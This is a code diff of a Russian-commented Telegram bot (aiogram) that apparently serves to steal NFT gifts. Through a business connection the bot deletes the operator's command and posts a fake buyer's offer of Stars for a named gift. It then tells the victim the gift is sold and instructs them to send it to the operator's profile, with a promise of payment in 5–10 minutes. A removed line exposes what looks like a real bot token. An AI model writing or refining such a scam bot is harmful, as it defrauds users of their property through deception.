@@ -9,11 +9,17 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 from aiogram.enums import ParseMode
 
-BOT_TOKEN = "9197044993:AAGIPSPk-6A01KbpjxgW2QzGx3djAXZbQVw"
+# --- НАСТРОЙКИ ---
+BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"
 MY_USERNAME = "oqraft"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
+
+offers_db = {}
+
+def generate_code():
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
 
 # --- СОЗДАНИЕ ОФФЕРА ---
 @dp.message(Command("start"))
@@ -31,10 +37,8 @@ async def create_offer(message: types.Message):
         lang = parts[-1]
         amount = parts[-3]
         nft_name = " ".join(parts[:-3])
-        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        code = generate_code()
         
-        # Сохраняем в память (на Render файлы могут сбрасываться, так что используем глобальную переменную)
-        global offers_db
         offers_db[code] = {"nft_name": nft_name, "amount": amount, "lang": lang}
         
         await message.answer(f"Оффер сохранён!\nКод: `/of {code}`", parse_mode="Markdown")
@@ -51,10 +55,11 @@ async def activate_offer(message: types.Message):
     offer_data = offers_db[code]
     b_conn_id = message.business_connection_id
 
+    # Удаляем сообщение с командой
     try:
         await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id, business_connection_id=b_conn_id)
-    except:
-        pass
+    except Exception as e:
+        print(f"Ошибка удаления: {e}")
 
     if offer_data["lang"] == "ru":
         text = f"<b>Jeffery готов(а) дать {offer_data['amount']} ⭐</b>\n<b>за <u>{offer_data['nft_name']}</u>.</b>\n\n<b>Действует ещё 23h 59m.</b>"
@@ -78,7 +83,6 @@ async def activate_offer(message: types.Message):
             business_connection_id=b_conn_id,
             link_preview_options={"is_disabled": False}
         )
-        print("Оффер отправлен!")
     except Exception as e:
         print(f"Ошибка: {e}")
 
@@ -93,7 +97,7 @@ async def process_accept(callback: types.CallbackQuery):
     await bot.edit_message_text(
         chat_id=callback.message.chat.id,
         message_id=callback.message.message_id,
-        text="<b>Внимание!</b>\n\nСледуйте инструкциям.",
+        text="<b>Внимание!</b>\n\nСледуйте инструкциям, чтобы не потерять подарок.",
         reply_markup=builder.as_markup(),
         parse_mode=ParseMode.HTML,
         business_connection_id=b_conn_id
@@ -107,9 +111,56 @@ async def process_ok(callback: types.CallbackQuery):
     if code in offers_db:
         data = offers_db[code]
         text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {data['amount']} ⭐."
+        
         builder = InlineKeyboardBuilder()
-        WEBAPP_URL = "https://nft-bot-1-tpl2.onrender.com"
-        builder.row(InlineKeyboardButton(text="Передать NFT", url=WEBAPP_URL))
+        # Кнопка ведет на профиль oqraft
+        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
+        
+        await bot.edit_message_text(
+            chat_id=callback.message.chat.id,
+            message_id=callback.message.message_id,
+            text=text,
+            reply_markup=builder.as_markup(),
+            business_connection_id=b_conn_id
+        )
+    await callback.answer()
+
+# --- НОВАЯ КНОПКА "КАК ПЕРЕДАТЬ NFT" ---
+@dp.callback_query(F.data.startswith("how_"))
+async def process_how_to(callback: types.CallbackQuery):
+    code = callback.data.split("_")[1]
+    b_conn_id = callback.message.business_connection_id
+    
+    # Текст инструкции
+    text = (
+        "Для передачи Nft-подарка, нужно нажать кнопку снизу, вернутся к передаче, после нажать кнопку передать-NFT, вас перекинет на профиль человека который купил нфт, нажать три точки сверху, и \"подарить подарок\" там выбрать нфт который вы продали и отправить, Внимание! После передачи нфт нужно подождать 5-10 минут для получения средств."
+    )
+    
+    builder = InlineKeyboardBuilder()
+    # Кнопка возврата к офферу
+    builder.row(InlineKeyboardButton(text="Вернуться к офферу", callback_data=f"back_{code}"))
+    
+    await bot.edit_message_text(
+        chat_id=callback.message.chat.id,
+        message_id=callback.message.message_id,
+        text=text,
+        reply_markup=builder.as_markup(),
+        business_connection_id=b_conn_id
+    )
+    await callback.answer()
+
+# --- ВОЗВРАТ К ОФФЕРУ ---
+@dp.callback_query(F.data.startswith("back_"))
+async def process_back(callback: types.CallbackQuery):
+    code = callback.data.split("_")[1]
+    b_conn_id = callback.message.business_connection_id
+    if code in offers_db:
+        data = offers_db[code]
+        text = f"🎁 Подарок: {data['nft_name']} продан!\n\nПередайте для зачисления {data['amount']} ⭐."
+        
+        builder = InlineKeyboardBuilder()
+        builder.row(InlineKeyboardButton(text="Передать NFT", url=f"https://t.me/{MY_USERNAME}"))
+        
         await bot.edit_message_text(
             chat_id=callback.message.chat.id,
             message_id=callback.message.message_id,
@@ -129,8 +180,6 @@ async def process_decline(callback: types.CallbackQuery):
         business_connection_id=b_conn_id
     )
     await callback.answer()
-
-offers_db = {}
 
 async def main():
     print("Бот запущен...")
